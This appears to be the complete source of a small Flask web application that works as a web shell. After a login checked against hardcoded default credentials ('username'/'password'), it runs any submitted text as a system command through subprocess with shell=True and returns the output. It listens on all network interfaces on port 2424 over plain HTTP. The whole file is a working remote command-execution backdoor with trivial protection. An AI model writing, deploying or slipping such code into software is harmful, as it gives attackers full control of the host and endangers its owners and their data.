from flask import Flask, request, render_template, redirect, url_for, session
import subprocess
import os

app = Flask(__name__)
app.secret_key = os.urandom(24)  # Secret key for sessions

# User credentials for authentication
USERNAME = 'username'
PASSWORD = 'password'

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username == USERNAME and password == PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('shell'))
        else:
            return 'Login failed. Please try again.'
    return '''
        <form method="post">
            <p><input type=text name=username>
            <p><input type=password name=password>
            <p><input type=submit value=Login>
        </form>
    '''

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/shell', methods=['GET', 'POST'])
def shell():
    if not session.get('logged_in'):
        return redirect(url_for('login'))

    command_output = None

    if request.method == 'POST':
        command = request.form.get('command')
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
            command_output = result
        except subprocess.CalledProcessError as e:
            command_output = f"Error: {e.returncode}\n{e.output}"

    return render_template('shell.html', command_output=command_output)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=2424)
